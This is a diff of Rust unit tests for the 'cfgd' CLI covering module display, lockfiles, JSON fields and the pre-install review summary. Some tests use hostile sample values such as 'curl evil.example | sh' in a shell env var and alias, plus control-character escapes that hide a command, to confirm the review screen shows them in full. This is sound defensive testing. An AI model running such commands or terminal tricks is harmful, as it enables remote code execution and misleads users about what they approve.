@@ -7,6 +7,7 @@ fn make_module_doc(packages: Vec<config::ModulePackageEntry>) -> config::ModuleD
         metadata: config::ModuleMetadata {
             name: "test".to_string(),
             description: None,
+            version: None,
         },
         spec: config::ModuleSpec {
             packages,
@@ -530,6 +531,64 @@ fn cmd_module_show_displays_details() {
     );
 }
 
+/// Write a lockfile naming a remote module whose URL is rejected before any
+/// network call, so a code path that loads locked modules fails loudly and
+/// offline.
+fn write_unloadable_lockfile(config_dir: &Path) {
+    std::fs::write(
+        config_dir.join("modules.lock"),
+        "modules:\n  - name: private-mod\n    url: \"not-a-git-url\"\n    pinnedRef: \"v1.0.0\"\n    commit: \"abc123\"\n    integrity: \"sha256:deadbeef\"\n",
+    )
+    .unwrap();
+}
+
+#[test]
+fn cmd_module_show_local_does_not_load_locked_remotes() {
+    let dir = setup_config_dir();
+    make_module(
+        dir.path(),
+        "local-mod",
+        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: local-mod\nspec:\n  packages: []\n",
+    );
+    write_unloadable_lockfile(dir.path());
+
+    let cli = test_cli(dir.path());
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+
+    cmd_module_show(&cli, &printer, "local-mod", false).unwrap();
+    drop(printer);
+
+    let output = buf.lock().unwrap();
+    assert!(
+        output.contains("Module: local-mod"),
+        "a local module must be readable without fetching unrelated remotes, got: {output}"
+    );
+}
+
+#[test]
+fn cmd_module_show_falls_through_to_locked_modules() {
+    let dir = setup_config_dir();
+    make_module(
+        dir.path(),
+        "local-mod",
+        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: local-mod\nspec:\n  packages: []\n",
+    );
+    write_unloadable_lockfile(dir.path());
+
+    let cli = test_cli(dir.path());
+    let (printer, _buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+
+    // A name that is not local must still consult the full loader — proven by
+    // the locked entry's own failure surfacing instead of "not found".
+    let err = cmd_module_show(&cli, &printer, "private-mod", false).unwrap_err();
+    assert!(
+        err.to_string().contains("not a git URL"),
+        "a non-local name must reach the locked-module loader, got: {err}"
+    );
+}
+
 #[test]
 fn cmd_module_show_with_available_hint() {
     let dir = setup_config_dir();
@@ -629,9 +688,14 @@ fn cmd_module_show_json_schema() {
     let json: serde_json::Value = serde_json::from_str(output.trim()).unwrap();
     assert!(json.get("name").is_some(), "JSON should have name field");
     assert_eq!(json["name"], "jmod");
+    let expected_dir = cfgd_core::to_posix_string(dir.path().join("modules").join("jmod"));
+    assert_eq!(
+        json["directory"], expected_dir,
+        "the -o json directory field must be POSIX-folded via to_posix_string, matching every other JSON path field in the CLI"
+    );
     assert!(
-        json.get("directory").is_some(),
-        "JSON should have directory field"
+        !json["directory"].as_str().unwrap().contains('\\'),
+        "the -o json directory field must never contain a native backslash separator"
     );
     assert!(
         json.get("source").is_some(),
@@ -3834,6 +3898,9 @@ fn module_list_entry_json_fields() {
 fn module_show_output_json_fields() {
     let output = ModuleShowOutput {
         name: "test-mod".to_string(),
+        metadata: ModuleShowMetadata {
+            version: Some("1.2.3".to_string()),
+        },
         directory: "/home/user/.config/cfgd/modules/test-mod".to_string(),
         source: "remote".to_string(),
         depends: vec!["base".to_string()],
@@ -3842,6 +3909,11 @@ fn module_show_output_json_fields() {
     };
     let json = serde_json::to_value(&output).unwrap();
     assert_eq!(json["name"], "test-mod");
+    assert_eq!(json["metadata"]["version"], "1.2.3");
+    assert!(
+        json["metadata"]["name"].is_null(),
+        "the module name has one selector, the top-level `name`"
+    );
     assert_eq!(json["source"], "remote");
     assert_eq!(json["depends"][0], "base");
     assert!(json["state"].is_null());
@@ -4024,6 +4096,7 @@ fn module_doc_with(
         metadata: config::ModuleMetadata {
             name: name.to_string(),
             description: None,
+            version: None,
         },
         spec: config::ModuleSpec {
             packages,
@@ -4040,7 +4113,8 @@ fn build_module_crd_json_emits_canonical_crd_envelope() {
     // Drifting any of these literal strings silently breaks `module push --apply`
     // for every existing operator-deployed cluster, so pin them here.
     let doc = module_doc_with("my-mod", vec![], vec![], vec![]);
-    let v = super::push_pull::build_module_crd_json(&doc, "ghcr.io/me/my-mod:v1");
+    let v = super::push_pull::build_module_crd_json(&doc, "ghcr.io/me/my-mod:v1", None)
+        .expect("build crd json");
 
     assert_eq!(v["apiVersion"], cfgd_core::API_VERSION);
     assert_eq!(v["kind"], "Module");
@@ -4054,7 +4128,12 @@ fn build_module_crd_json_uses_module_name_not_artifact_for_metadata() {
     // ref. The CRD names live in k8s; the artifact ref lives in OCI. Conflating
     // them would make every artifact-renamed module push create a NEW CRD.
     let doc = module_doc_with("module-canonical", vec![], vec![], vec![]);
-    let v = super::push_pull::build_module_crd_json(&doc, "ghcr.io/whatever/totally-different:v9");
+    let v = super::push_pull::build_module_crd_json(
+        &doc,
+        "ghcr.io/whatever/totally-different:v9",
+        None,
+    )
+    .expect("build crd json");
 
     assert_eq!(v["metadata"]["name"], "module-canonical");
     assert_ne!(v["metadata"]["name"], "totally-different");
@@ -4074,7 +4153,7 @@ fn build_module_crd_json_packages_emit_only_name_field() {
     pkg.platforms = vec!["darwin".into()];
 
     let doc = module_doc_with("m", vec![pkg], vec![], vec![]);
-    let v = super::push_pull::build_module_crd_json(&doc, "art");
+    let v = super::push_pull::build_module_crd_json(&doc, "art", None).expect("build crd json");
 
     let pkgs = v["spec"]["packages"].as_array().expect("packages array");
     assert_eq!(pkgs.len(), 1);
@@ -4100,7 +4179,7 @@ fn build_module_crd_json_files_emit_only_source_and_target() {
         permissions: None,
     };
     let doc = module_doc_with("m", vec![], vec![f], vec![]);
-    let v = super::push_pull::build_module_crd_json(&doc, "art");
+    let v = super::push_pull::build_module_crd_json(&doc, "art", None).expect("build crd json");
 
     let files = v["spec"]["files"].as_array().expect("files array");
     assert_eq!(files.len(), 1);
@@ -4120,7 +4199,7 @@ fn build_module_crd_json_depends_passes_through_verbatim() {
         vec![],
         vec!["base".into(), "shell".into(), "git".into()],
     );
-    let v = super::push_pull::build_module_crd_json(&doc, "art");
+    let v = super::push_pull::build_module_crd_json(&doc, "art", None).expect("build crd json");
 
     let depends = v["spec"]["depends"].as_array().expect("depends array");
     let names: Vec<&str> = depends.iter().filter_map(|d| d.as_str()).collect();
@@ -4134,7 +4213,7 @@ fn build_module_crd_json_empty_collections_emit_as_empty_arrays_not_null() {
     // means "set to empty"). The patch must always emit `[]` so that
     // an apply removes any stale entries from a previous module version.
     let doc = module_doc_with("m", vec![], vec![], vec![]);
-    let v = super::push_pull::build_module_crd_json(&doc, "art");
+    let v = super::push_pull::build_module_crd_json(&doc, "art", None).expect("build crd json");
 
     assert!(v["spec"]["packages"].is_array());
     assert!(v["spec"]["files"].is_array());
@@ -4521,6 +4600,7 @@ fn filter_and_build_search_results_preserves_registry_name_in_output() {
 
 fn make_loaded_module(name: &str, spec: config::ModuleSpec) -> modules::LoadedModule {
     modules::LoadedModule {
+        version: None,
         name: name.to_string(),
         spec,
         dir: std::path::PathBuf::from("/tmp/test-module"),
@@ -4657,6 +4737,295 @@ fn print_module_review_summary_omits_empty_sections() {
     assert!(!out.contains("Packages ("), "no packages section: {out}");
     assert!(!out.contains("Files ("), "no files section: {out}");
     assert!(!out.contains("Post-apply"), "no scripts section: {out}");
+}
+
+#[test]
+fn print_module_review_summary_shows_env_and_alias_payloads_verbatim() {
+    // An env value and an alias command are written into the login-shell
+    // startup files, so they reach the same "runs on your machine" outcome a
+    // post-apply script does. The pre-approval view must show both in full —
+    // a payload hidden behind an elided value is approved sight-unseen.
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            env: vec![cfgd_core::config::EnvVar {
+                name: "PROMPT_COMMAND".into(),
+                value: "$(curl evil.example | sh)".into(),
+            }],
+            aliases: vec![cfgd_core::config::ShellAlias {
+                name: "ls".into(),
+                command: "curl evil.example | sh; ls".into(),
+            }],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    assert!(out.contains("Environment (1)"), "env section header: {out}");
+    assert!(
+        out.contains("PROMPT_COMMAND=$(curl evil.example | sh)"),
+        "env value verbatim: {out}"
+    );
+    assert!(out.contains("Aliases (1)"), "alias section header: {out}");
+    assert!(
+        out.contains("ls=curl evil.example | sh; ls"),
+        "alias command verbatim: {out}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_renders_a_multiline_env_value_in_full() {
+    // A newline in an env value would truncate a bullet-rendered entry to its
+    // first line, which is exactly where a second command would be parked.
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            env: vec![cfgd_core::config::EnvVar {
+                name: "BANNER".into(),
+                value: "line-one\ncurl evil.example | sh".into(),
+            }],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    assert!(out.contains("BANNER=line-one"), "first line: {out}");
+    assert!(
+        out.contains("curl evil.example | sh"),
+        "second line must survive: {out}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_escapes_control_characters_in_a_payload() {
+    // A raw `\r` returns the cursor and `\x1b[2K` erases the line, so a value
+    // carrying either can overwrite the text describing it and leave the user
+    // approving something other than what they read.
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            env: vec![cfgd_core::config::EnvVar {
+                name: "SNEAKY".into(),
+                value: "harmless\r\x1b[2Kcurl evil.example | sh".into(),
+            }],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    // Scoped to the entry line: the surrounding output carries the Printer's
+    // own theming escapes, which are cfgd's to emit and not under review.
+    let entry = out
+        .lines()
+        .find(|l| l.contains("SNEAKY"))
+        .expect("env entry should render");
+    assert_eq!(
+        cfgd_core::output::strip_ansi(entry).trim_start(),
+        "- SNEAKY=harmless\\x0d\\x1b[2Kcurl evil.example | sh",
+        "control characters must be escaped, not passed through"
+    );
+    // The bullet marker itself is styled, so the live-byte checks take the
+    // module-supplied payload rather than the whole line: cfgd's own theming
+    // escape is not what this test is guarding against.
+    let payload = entry
+        .find("SNEAKY")
+        .map(|i| &entry[i..])
+        .unwrap_or_default();
+    assert!(
+        !payload.contains('\r'),
+        "no live carriage return: {entry:?}"
+    );
+    assert!(
+        !payload.contains('\u{1b}'),
+        "no live escape byte: {entry:?}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_shows_a_padded_value_untrimmed() {
+    // The user is approving the exact text that will be written into their
+    // shell startup file; silently trimming it puts a different value on
+    // screen than the one under review.
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            env: vec![cfgd_core::config::EnvVar {
+                name: "PADDED".into(),
+                value: "  spaced  ".into(),
+            }],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    assert!(
+        out.contains("PADDED=  spaced  "),
+        "value must not be trimmed: {out:?}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_omits_env_and_alias_sections_when_absent() {
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            depends: vec!["base".into()],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    assert!(!out.contains("Environment ("), "no env section: {out}");
+    assert!(!out.contains("Aliases ("), "no alias section: {out}");
+}
+
+#[test]
+fn has_second_non_empty_line_shared_predicate_matches_both_review_surfaces() {
+    // `print_module_review_summary`'s post-apply-script rendering and the
+    // upgrade-diff "Changes" section both gate bullet-vs-code_block on this
+    // one function now — pin the exact cases that used to disagree under
+    // the old `contains('\n')` gate (a `run: |` block scalar's trailing
+    // newline survives into a single logical line) and the true
+    // multi-line case that must still render as a code block.
+    assert!(
+        !super::registry::has_second_non_empty_line("echo hello"),
+        "single line, no trailing newline"
+    );
+    assert!(
+        !super::registry::has_second_non_empty_line("echo hello\n"),
+        "single logical line with a trailing newline (`run: |` shape) must not need a code block"
+    );
+    assert!(
+        !super::registry::has_second_non_empty_line("\necho hello"),
+        "a leading blank line is not a second non-empty line"
+    );
+    assert!(
+        super::registry::has_second_non_empty_line("echo one\necho two"),
+        "two non-empty lines must need a code block"
+    );
+    assert!(!super::registry::has_second_non_empty_line(""));
+}
+
+#[test]
+fn upgrade_diff_trailing_newline_script_change_renders_as_single_bullet_not_code_block() {
+    // Mirrors `print_module_review_summary_trailing_newline_script_renders_as_single_bullet`
+    // but for the sibling upgrade-diff surface (`cmd_module_upgrade`'s
+    // "Changes" section) — this surface previously gated on raw
+    // `change.contains('\n')`, which disagreed with
+    // `print_module_review_summary`, so a `run: |` single-logical-line
+    // `postApply script` diff (whose `run_str()` carries a trailing `\n`)
+    // rendered as a code block here while the pre-approval review rendered
+    // the identical body as a bullet.
+    let old = make_loaded_module("m", config::ModuleSpec::default());
+    let new = module_with_post_apply_script("echo hello\n");
+    let changes = modules::diff_module_specs(&old, &new);
+    let change = changes
+        .iter()
+        .find(|c| c.contains("postApply script"))
+        .expect("expected a postApply script diff entry");
+    assert!(
+        !super::registry::has_second_non_empty_line(change),
+        "a single logical line with a trailing newline must not be routed to a code block: {change:?}"
+    );
+}
+
+fn module_with_post_apply_script(run: &str) -> modules::LoadedModule {
+    make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            scripts: Some(config::ScriptSpec {
+                pre_apply: vec![],
+                post_apply: vec![cfgd_core::config::ScriptEntry::Simple(run.to_string())],
+                ..Default::default()
+            }),
+            ..Default::default()
+        },
+    )
+}
+
+#[test]
+fn print_module_review_summary_single_line_script_renders_as_bullet() {
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = module_with_post_apply_script("echo hello");
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = cfgd_core::output::strip_ansi(&buf.lock().unwrap());
+    assert!(
+        out.contains("- $ echo hello"),
+        "expected bullet line: {out}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_trailing_newline_script_renders_as_single_bullet() {
+    // The `run: |` YAML block-scalar shape: `run_str()` returns the line plus
+    // a trailing `\n`. This is the exact case that used to reach `bullet()`
+    // with an embedded newline and trip the `write_line` debug_assert.
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = module_with_post_apply_script("echo hello\n");
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = cfgd_core::output::strip_ansi(&buf.lock().unwrap());
+    assert!(
+        out.contains("- $ echo hello"),
+        "expected trimmed bullet line: {out}"
+    );
+    assert_eq!(
+        out.matches("$ echo hello").count(),
+        1,
+        "trailing newline must not produce a second rendered line: {out}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_leading_blank_line_script_renders_as_single_bullet() {
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = module_with_post_apply_script("\necho hello");
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = cfgd_core::output::strip_ansi(&buf.lock().unwrap());
+    assert!(
+        out.contains("- $ echo hello"),
+        "expected trimmed bullet line: {out}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_multi_line_script_renders_every_line_verbatim() {
+    // Genuine multi-line scripts must stay verbatim via `code_block` (not
+    // condensed to a single line) — this is the pre-install security review
+    // of a remote module's script, so nothing after the first line may be
+    // hidden from the user.
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = module_with_post_apply_script("echo one\necho two");
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    assert!(out.contains("$ echo one"), "first line verbatim: {out}");
+    assert!(out.contains("$ echo two"), "second line verbatim: {out}");
+    assert!(
+        !out.contains("- $ echo one") && !out.contains("- $ echo two"),
+        "multi-line script must render via code_block (no bullet dash), not condensed: {out}"
+    );
 }
 
 // ============================================================================
@@ -6458,6 +6827,43 @@ fn cmd_module_update_remove_nonexistent_script_warns_not_found() {
     assert!(
         output.contains("No changes specified"),
         "an unmatched script removal makes no change: {output}"
+    );
+}
+
+// The "not found" message must echo the raw removal argument (flattened via
+// `collapse_to_subject_line`, all lines preserved), not
+// `condense_script_label`'s truncated first-line-only view — a condensed
+// echo would hide the exact text that failed to match.
+#[test]
+fn cmd_module_update_remove_nonexistent_multiline_script_reports_raw_not_condensed() {
+    let dir = tempfile::tempdir().unwrap();
+    make_module(
+        dir.path(),
+        "noscript-multiline",
+        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: noscript-multiline\nspec:\n  packages: []\n",
+    );
+
+    let cli = test_cli(dir.path());
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+
+    let args = super::ModuleUpdateArgs {
+        post_apply: vec!["-line-one\nline-two".to_string()],
+        ..make_module_update_args("noscript-multiline")
+    };
+    cmd_module_update_local(&cli, &printer, &args)
+        .expect("removing an absent multi-line script must warn, not error");
+    drop(printer);
+
+    let output = buf.lock().unwrap();
+    assert!(
+        output.contains("line-two"),
+        "not-found message must echo the full raw argument, got: {output}"
+    );
+    assert!(
+        output.contains("line-one — line-two"),
+        "raw argument must be joined via collapse_to_subject_line, not truncated to \
+         just the first line, got: {output}"
     );
 }
 
